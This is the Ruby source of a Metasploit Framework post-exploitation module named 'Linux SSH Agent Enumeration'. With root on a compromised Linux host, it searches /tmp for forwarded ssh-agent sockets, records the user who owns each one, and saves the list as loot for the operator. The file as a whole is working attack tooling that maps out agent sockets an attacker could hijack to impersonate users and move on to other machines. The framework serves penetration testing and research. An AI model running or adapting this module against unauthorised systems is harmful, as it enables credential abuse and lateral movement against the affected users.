##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'rex/post/file_stat'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/priv'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Linux::Priv
	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Linux SSH Agent Enumeration',
				'Description'   => %q{
					This module lists sockets created by ssh-agent forwarding.
				},
				'License'       => MSF_LICENSE,
				'Author'        =>
					[
						'Marc Wickenden (@marcwickenden) <wicky[at]0x41.cc>',
                        'Stephen Haywood <averagesecurityguy[at]gmail.com>',
					],
				'Version'       => '$Revision$',
				'Platform'      => [ 'linux' ],
				'SessionTypes'  => [ "shell", "meterpreter" ]
			))
	end

    # function executed when the run command is....run
	def run
		if is_root?
            print_status("Enumerating as root")
            data = ''
            list = execute("/usr/bin/find /tmp -path /tmp/ssh-\\* -name \\*agent\\*")
            list.each_line do |file|
                stat = stat_file(file.chomp)
                data += stat['user'] + "," + stat['file_name'] + "\n"
            end
		else
			raise "This post module must be run as root. Try harder"
		end

        # Save agent data to loot
        save("ssh-agent sockets", data)

	end

	# Save enumerated data
	def save(msg, data, ctype="text/csv")
		ltype = "linux.enum.ssh_agents"
		loot = store_loot(ltype, ctype, session, data, nil, msg)
		print_status("#{msg} stored in #{loot.to_s}")
	end

	def execute(cmd)
		vprint_status("Execute: #{cmd}")
		output = cmd_exec(cmd)
		return output
	end

end

